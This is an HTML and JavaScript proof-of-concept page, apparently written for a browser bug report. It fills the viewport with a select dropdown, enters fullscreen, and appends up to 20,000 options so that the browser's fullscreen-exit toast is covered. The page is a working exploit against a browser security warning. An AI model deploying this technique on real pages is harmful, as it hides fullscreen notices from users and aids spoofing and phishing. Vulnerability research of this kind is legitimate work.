<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Fullscreen Dropdown PoC (Improved)</title>
<style>
  body { margin:0; padding:0; overflow:hidden; font-family: Arial, sans-serif; }

  #testSelect {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    font-size: 2.5em;
    z-index: 999999;
  }

  #overlayText {
    position: fixed;
    top: 10px;
    left: 10px;
    font-size: 1.5em;
    color: red;
    background: rgba(255,255,255,0.7);
    padding: 5px 10px;
    z-index: 1000000;
  }

  button {
    position: fixed;
    bottom: 20px;
    left: 20px;
    font-size: 1.2em;
    padding: 10px 20px;
    z-index: 1000001;
  }
</style>
</head>
<body>

<div id="overlayText">Observe fullscreen toast overlap</div>
<button onclick="startPoC()">Enter Fullscreen</button>
<select id="testSelect"></select>

<script>
function startPoC() {
  const select = document.getElementById("testSelect");

  // Step 1: isi awal (langsung terlihat)
  for (let i = 0; i < 1000; i++) {
    let opt = document.createElement("option");
    opt.textContent = "Option " + i;
    select.appendChild(opt);
  }

  // Step 2: masuk fullscreen di timing frame
  requestAnimationFrame(() => {
    document.documentElement.requestFullscreen();

    // Step 3: buka dropdown segera setelah fullscreen
    setTimeout(() => {
      select.focus();
      select.size = 25;
    }, 30);

    // Step 4: tambah option bertahap (lebih stabil dari loop besar)
    let i = 1000;
    function addMore() {
      for (let j = 0; j < 500; j++) {
        let opt = document.createElement("option");
        opt.textContent = "Option " + i++;
        select.appendChild(opt);
      }

      if (i < 20000) {
        requestAnimationFrame(addMore);
      }
    }
    addMore();
  });
}
</script>

</body>
</html>
